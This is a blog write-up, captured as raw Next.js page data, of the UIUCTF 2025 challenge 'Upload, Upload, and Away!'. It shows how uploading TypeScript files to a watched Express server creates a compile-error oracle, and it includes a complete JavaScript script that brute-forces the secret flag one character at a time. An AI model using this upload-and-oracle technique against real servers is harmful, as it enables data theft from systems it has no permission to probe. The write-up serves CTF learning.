1:"$Sreact.fragment"
2:I[87555,[],""]
3:I[31295,[],""]
4:I[6874,["874","static/chunks/874-3e820bd666038662.js","633","static/chunks/app/writeups/%5Bid%5D/layout-2577bd3482649595.js"],""]
6:I[59665,[],"OutletBoundary"]
8:I[74911,[],"AsyncMetadataOutlet"]
a:I[59665,[],"ViewportBoundary"]
c:I[59665,[],"MetadataBoundary"]
d:"$Sreact.suspense"
f:I[28393,[],""]
:HL["/_next/static/media/e4af272ccee01ff0-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
:HL["/_next/static/css/b7a1bece15a86168.css","style"]
0:{"P":null,"b":"scCeJOABsuN-qPV3g5t-H","p":"","c":["","writeups","8096bd32165fc11285468e3ee1a3997c"],"i":false,"f":[[["",{"children":["writeups",{"children":[["id","8096bd32165fc11285468e3ee1a3997c","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/b7a1bece15a86168.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"className":"dark scroll-smooth","children":[["$","head",null,{"children":["$","meta",null,{"charSet":"utf-8"}]}],["$","body",null,{"className":"text-dark dark:text-white dark:bg-midnight","style":{"fontFamily":"'Inter', 'Inter Fallback'","fontStyle":"normal"},"children":["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","div",null,{"className":"h-screen flex items-center justify-center","children":["$","main",null,{"className":"relative pl-14","children":[["$","svg",null,{"stroke":"currentColor","fill":"currentColor","strokeWidth":"0","viewBox":"0 0 512 512","className":"absolute left-0 top-2 text-5xl text-grapefruit","children":["$undefined",[["$","path","0",{"d":"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z","children":"$undefined"}]]],"style":{"color":"$undefined"},"height":"1em","width":"1em","xmlns":"http://www.w3.org/2000/svg"}],["$","h1",null,{"className":"font-bold text-7xl underline decoration-grapefruit mb-5","children":"404."}],["$","p",null,{"children":"Your requested page was not found."}],["$","$L4",null,{"href":"/","className":"font-medium text-inherit","children":"Return to home →"}]]}]}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}]]}]]}],{"children":["writeups",["$","$1","c",{"children":[null,["$","main",null,{"className":"container pt-20 pb-24","children":["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]}]]}],{"children":[["id","8096bd32165fc11285468e3ee1a3997c","d"],["$","$1","c",{"children":[null,[["$","$L4",null,{"href":"/writeups","className":"text-secondary text-sm mb-10 -ml-5 block w-max","children":"← Back to writeups"}],["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$L5",null,["$","$L6",null,{"children":["$L7",["$","$L8",null,{"promise":"$@9"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,[["$","$La",null,{"children":"$Lb"}],["$","meta",null,{"name":"next-size-adjust","content":""}]],["$","$Lc",null,{"children":["$","div",null,{"hidden":true,"children":["$","$d",null,{"fallback":null,"children":"$Le"}]}]}]]}],false]],"m":"$undefined","G":["$f",[]],"s":false,"S":true}
b:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
7:null
10:I[50674,["263","static/chunks/bc9c3264-6371ca03223855d4.js","810","static/chunks/48507feb-8452885980bba250.js","330","static/chunks/08ffe114-f47006c90e36a3eb.js","800","static/chunks/800-bd0deb6e7b7e903a.js","134","static/chunks/app/writeups/%5Bid%5D/page-54fe20cc7a9d3224.js"],"default"]
11:T6ad,import express from "express";
import path from "path";
import multer from "multer";
import fs from "fs";

const app = express();
const PORT = process.env.PORT || 3000;

let fileCount = 0;

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "../public/index.html")); // paths are relative to dist/
});

const imagesDir = path.join(__dirname, "../images");
if (!fs.existsSync(imagesDir)) {
  fs.mkdirSync(imagesDir, { recursive: true });
}

const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, imagesDir);
  },
  filename: function (req, file, cb) {
    cb(null, path.basename(file.originalname));
  },
});

const upload = multer({ storage });

app.get("/filecount", (req, res) => {
  res.json({ file_count: fileCount });
});

app.post("/upload", upload.single("file"), (req, res) => {
  if (!req.file) {
    return res.status(400).send("No file uploaded.");
  }
  fileCount++;
  res.send("File uploaded successfully.");
});

app.delete("/images", (req, res) => {
  const imagesDir = path.join(__dirname, "../images");
  fs.readdir(imagesDir, (err, files) => {
    if (err) {
      return res.status(500).send("Failed to read images directory.");
    }
    let deletePromises = files.map((file) =>
      fs.promises.unlink(path.join(imagesDir, file))
    );
    Promise.allSettled(deletePromises)
      .then(() => {
        fileCount = 0;
        res.send("All files deleted from images directory.");
      })
      .catch(() => res.status(500).send("Failed to delete some files."));
  });
});

app.listen(PORT, () => {
  return console.log(`Express is listening at http://localhost:${PORT}`);
});

export const flag = "uiuctf{fake_flag_xxxxxxxxxxxxxxxx}";5:["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"UIUCTF 2025 — Upload, Upload, and Away!"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"Keeping track of all these files makes me so dizzy I feel like I'm floating in space."}],"\n",["$","p","p-1",{"children":["Instancer url: ",["$","a","a-0",{"href":"https://upload-upload-and-away.chal.uiuc.tf/","children":"https://upload-upload-and-away.chal.uiuc.tf/"}]]}],"\n",["$","p","p-2",{"children":"Flag format: uiuctf{[a-z_]+}"}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a TypeScript server that looks like this:"}],"\n",["$","$L10","pre-0",{"className":"my-2","children":"$11","language":"js"}],"\n",["$","p","p-1",{"children":["The express app exposes a few routes that let us upload files to the ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"../images"}]," directory on the server, as well as query the \"file count\" tracking the number of files that have been uploaded."]}],"\n",["$","p","p-2",{"children":["Curiously, looking in the project ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"package.json"}],","]}],"\n",["$","$L10","pre-1",{"className":"my-2","children":"{\n  \"name\": \"tschal\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"start\": \"concurrently \\\"tsc -w\\\" \\\"nodemon dist/index.js\\\"\"\n  },\n  \"keywords\": [\n    \"i miss bun, if only there was an easier way to use typescript and nodejs :)\"\n  ],\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"description\": \"\",\n  \"devDependencies\": {\n    \"@types/express\": \"^5.0.3\",\n    \"@types/multer\": \"^2.0.0\",\n    \"concurrently\": \"^9.2.0\",\n    \"nodemon\": \"^3.1.10\",\n    \"typescript\": \"^5.8.3\"\n  },\n  \"dependencies\": {\n    \"express\": \"^5.1.0\",\n    \"multer\": \"^2.0.2\"\n  }\n}","language":"json"}],"\n","$L12","\n","$L13","\n","$L14","\n","$L15","\n","$L16","\n","$L17","\n","$L18","\n","$L19","\n","$L1a","\n","$L1b","\n","$L1c","\n","$L1d","\n","$L1e","\n","$L1f","\n","$L20","\n","$L21","\n","$L22","\n","$L23","\n","$L24","\n","$L25"]}]}]
12:["$","p","p-3",{"children":["the server uses ",["$","a","a-0",{"href":"https://www.npmjs.com/package/concurrently","children":["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"concurrently"}]}]," to run ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"tsc -w"}]," and ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"nodemon dist/index.js"}]," simultaneously. The key observation is this:"]}]
13:["$","ul","ul-0",{"children":["\n",["$","li","li-0",{"children":[["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"tsc -w"}]," runs the TypeScript compiler in ",["$","a","a-0",{"href":"https://www.typescriptlang.org/docs/handbook/compiler-options.html","children":"watch mode"}],", telling it to automatically recompile the project when source files have changed."]}],"\n",["$","li","li-1",{"children":[["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"nodemon"}]," will ",["$","a","a-0",{"href":"https://www.npmjs.com/package/nodemon","children":"restart the server"}]," when a ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":".js"}]," file has changed."]}],"\n",["$","li","li-2",{"children":"Since the file count is just a local variable, when the server restarts it will be reset to 0."}],"\n"]}]
14:["$","p","p-4",{"children":["The above combine to give us a TypeScript error oracle: uploading TypeScript files to the server will trigger ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"tsc"}]," to recompile the project. If the compilation succeeds, new ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":".js"}]," files will be generated that will trigger ",["$","code","code-2",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"nodemon"}]," to restart the server and reset the file count; otherwise, the file count will be incremented as normal. Querying the file count, therefore, lets us check whether arbitrary TypeScript code compiles on the server."]}]
15:["$","p","p-5",{"children":"Indeed, we can test with simple TS files that both fails to and succeed in compiling. Uploading a TypeScript file that fails to compile, we get"}]
16:["$","$L10","pre-2",{"className":"my-2","children":"import { flag }  from '../index';\n\nexport const x: number = flag;","language":"ts"}]
17:["$","$L10","pre-3",{"className":"my-2","children":"5:47:53 PM - File change detected. Starting incremental compilation...\n[0]\n[0] images/test.ts(3,14): error TS2322: Type 'string' is not assignable to type 'number'.\n[0]\n[0] 5:47:53 PM - Found 1 error. Watching for file changes.","language":"bash"}]
18:["$","p","p-6",{"children":"but using a file that successfully compiles, we instead get"}]
19:["$","$L10","pre-4",{"className":"my-2","children":"import { flag }  from '../index';\n\nexport const x: string = flag;","language":"ts"}]
1a:["$","$L10","pre-5",{"className":"my-2","children":"5:44:58 PM - File change detected. Starting incremental compilation...\n[0]\n[0]\n[0] 5:44:59 PM - Found 0 errors. Watching for file changes.\n[1] [nodemon] restarting due to changes...\n[1] [nodemon] starting `node dist/index.js`\n[1] Express is listening at http://localhost:3000","language":"bash"}]
1b:["$","p","p-7",{"children":"and our file count is reset to 0."}]
1c:["$","p","p-8",{"children":["We can use this error oracle to leak the flag with a technique reminiscent of ",["$","a","a-0",{"href":"https://kevin.fish/writeups/a851fdabc90d887a61af81c071f6f0ce","children":"BuckeyeCTF 2023"}],": since the flag is exported from ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"index.ts"}]," as a ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"const"}]," variable, we can use ",["$","a","a-1",{"href":"https://www.typescriptlang.org/docs/handbook/2/template-literal-types.html","children":"template literal types"}]," to assert against substrings of the flag."]}]
1d:["$","p","p-9",{"children":["Concretely, for those not familiar with this technique, if the flag exported by ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"index.ts"}]," was"]}]
1e:["$","$L10","pre-6",{"className":"my-2","children":"export const flag = 'uiuctf{test_flag}'  // flag: \"uiuctf{test_flag}\"","language":"ts"}]
1f:["$","p","p-10",{"children":["then the first assignment would successfully type check, while the second fails (since the first character of the ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"flag"}]," string is not ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"a"}],"):"]}]
20:["$","$L10","pre-7",{"className":"my-2","children":"const foo: `u${string}` = flag;","language":"ts"}]
21:["$","$L10","pre-8",{"className":"my-2","children":"const foo: `a${string}` = flag;  // Type '\"uiuctf{test_flag}\"' is not assignable to type '`a${string}`'.","language":"ts"}]
22:["$","p","p-11",{"children":"Thus, we just need to use template literals to brute force the flag character by character, checking the file count each time to determine if the character was correct. Here's a simple script that does just that:"}]
26:T5b2,const BASE_URL = 'https://inst-ff5e88fd8f55fd4e-upload-upload-and-away.chal.uiuc.tf/';

function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

async function getFileCount() {
    const { file_count } = await (await fetch(`${BASE_URL}/filecount`)).json();
    return file_count;
}

async function deleteImages() {
    await fetch(`${BASE_URL}/images`, {
        method: 'DELETE'
    });
}

async function uploadCode(code) {
    const data = new FormData();
    data.append('file', new Blob([code], { type: 'text/plain' }), 'test.ts');

    const res = await (await fetch(`${BASE_URL}/upload`, {
        method: 'POST',
        body: data
    })).text()

    // console.log(res);
}

const charset = 'abcdefghijklmnopqrstuvwxyz_}'
let flag = 'uiuctf{'

async function bruteOnce(char) {
    await deleteImages();
    await uploadCode(`import { flag } from '../index'; export const x: \`${flag}${char}\$\{string\}\` = flag;`);

    // Sleep so that the server has time to restart if the type check passes
    await sleep(1500);
    const count = await getFileCount();

    return count === 0;
}

;(async () => {
    while (true) {
        for (const char of charset) {
            console.log(char);
            const valid = await bruteOnce(char);

            if (!valid) continue;

            flag += char;
            console.log('flag:', flag);
            break;
        }

        if (flag.at(-1) === '}') break;
    }
})();23:["$","$L10","pre-9",{"className":"my-2","children":"$26","language":"js"}]
24:["$","p","p-12",{"children":"Running the script for a few minutes, we get the flag."}]
25:["$","$L10","pre-10",{"className":"my-2","children":"uiuctf{turing_complete_azolwkamgj}","language":"$undefined"}]
9:{"metadata":[["$","title","0",{"children":"UIUCTF 2025 — Upload, Upload, and Away! | kevin.fish"}],["$","meta","1",{"name":"description","content":"Keeping track of all these files makes me so dizzy I feel like I'm floating in space."}],["$","meta","2",{"property":"og:title","content":"UIUCTF 2025 — Upload, Upload, and Away!"}],["$","meta","3",{"property":"og:description","content":"Keeping track of all these files makes me so dizzy I feel like I'm floating in space."}],["$","meta","4",{"name":"twitter:card","content":"summary"}],["$","meta","5",{"name":"twitter:title","content":"UIUCTF 2025 — Upload, Upload, and Away!"}],["$","meta","6",{"name":"twitter:description","content":"Keeping track of all these files makes me so dizzy I feel like I'm floating in space."}]],"error":null,"digest":"$undefined"}
e:"$9:metadata"
